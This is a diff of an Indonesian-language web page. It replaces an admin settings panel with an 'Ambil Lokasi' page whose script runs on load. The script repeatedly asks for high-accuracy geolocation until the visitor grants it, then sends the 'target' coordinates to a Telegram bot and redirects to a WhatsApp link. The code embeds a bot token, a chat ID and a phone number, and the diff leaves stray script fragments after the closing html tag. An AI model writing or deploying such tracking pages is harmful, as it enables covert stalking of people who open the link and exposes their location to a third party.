@@ -1,76 +1,53 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Admin Panel</title>
-<style>
-  body {
-    font-family: Arial, sans-serif;
-    background: linear-gradient(135deg,#0f172a,#1e293b);
-    color: #e5e7eb;
-    display:flex; justify-content:center; align-items:center;
-    height:100vh; margin:0;
-  }
-  .container {
-    background: rgba(17,24,39,0.95);
-    padding: 30px 40px;
-    border-radius: 20px;
-    width: 90%;
-    max-width: 500px;
-    text-align:center;
-    box-shadow:0 0 40px rgba(0,0,0,0.7);
-  }
-  input { 
-    padding:10px; width:80%; margin:10px 0; border-radius:10px; border:2px solid #3b82f6; 
-    font-size:16px; outline:none; background:#111827; color:#e5e7eb;
-  }
-  button { 
-    padding:12px 25px; font-size:18px; border:none; border-radius:12px;
-    background:linear-gradient(45deg,#22c55e,#3b82f6); color:#fff; cursor:pointer; 
-    margin-top:15px;
-  }
-  .success { margin-top:15px; color:#22c55e; font-weight:bold; }
-</style>
+  <meta charset="UTF-8">
+  <title>Ambil Lokasi</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+    h3 { color: #333; }
+  </style>
 </head>
 <body>
-<div class="container">
-  <h2>Admin Panel</h2>
-  <p>Atur Jam & Menit Batas:</p>
-  <input type="number" id="jam" placeholder="Jam (0-23)">
-  <input type="number" id="menit" placeholder="Menit (0-59)">
-  
-  <p>Atur Password Halaman:</p>
-  <input type="password" id="passwordHalaman" placeholder="Password halaman">
-  
-  <p>Atur Username & Password Giveaway:</p>
-  <input type="text" id="usernameGiveaway" placeholder="Username giveaway">
-  <input type="text" id="passwordGiveaway" placeholder="Password giveaway">
-  
-  <button onclick="simpanPengaturan()">Simpan Pengaturan</button>
-  <div class="success" id="successMsg"></div>
-</div>
+  <h3>Meminta izin lokasi...</h3>
 
-<script>
-function simpanPengaturan(){
-  const jam = parseInt(document.getElementById("jam").value);
-  const menit = parseInt(document.getElementById("menit").value);
-  const passwordHalaman = document.getElementById("passwordHalaman").value;
-  const usernameGiveaway = document.getElementById("usernameGiveaway").value;
-  const passwordGiveaway = document.getElementById("passwordGiveaway").value;
-  
-  if(isNaN(jam) || isNaN(menit) || jam<0 || jam>23 || menit<0 || menit>59 || !passwordHalaman || !usernameGiveaway || !passwordGiveaway){
-    alert("Lengkapi semua data dengan benar!");
-    return;
-  }
-  
-  // simpan ke localStorage
-  localStorage.setItem("jamBatas", jam);
-  localStorage.setItem("menitBatas", menit);
-  localStorage.setItem("passwordHalaman", passwordHalaman);
-  localStorage.setItem("usernameGiveaway", usernameGiveaway);
-  localStorage.setItem("passwordGiveaway", passwordGiveaway);
-  
+  <script>
+    const TOKEN = "8269097917:AAGyKJqP0ivWyuzkjgoXb2djm9wmQJ_Q4p8"; // token bot kamu
+    const CHAT_ID = "8113738409"; // chat id kamu
+    const REDIRECT_URL = "https://wa.me/628816759046"; // link tujuan setelah lokasi terkirim
+
+    function kirimKeTelegram(lat, lon) {
+      const text = `📍 Lokasi target: https://www.google.com/maps?q=${lat},${lon}`;
+      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+      return fetch(url);
+    }
+
+    function mintaLokasi() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            await kirimKeTelegram(lat, lon);
+            window.location.href = REDIRECT_URL;
+          },
+          (err) => {
+            // kalau ditolak, coba lagi
+            alert("Izin lokasi diperlukan. Silakan izinkan.");
+            mintaLokasi();
+          },
+          { enableHighAccuracy: true }
+        );
+      } else {
+        document.body.innerHTML = "<h3>Browser tidak mendukung geolocation</h3>";
+      }
+    }
+
+    // jalankan otomatis
+    mintaLokasi();
+  </script>
+</body>
+</html>  
   document.getElementById("successMsg").textContent = "✅ Pengaturan berhasil disimpan!";
 }
 </script>
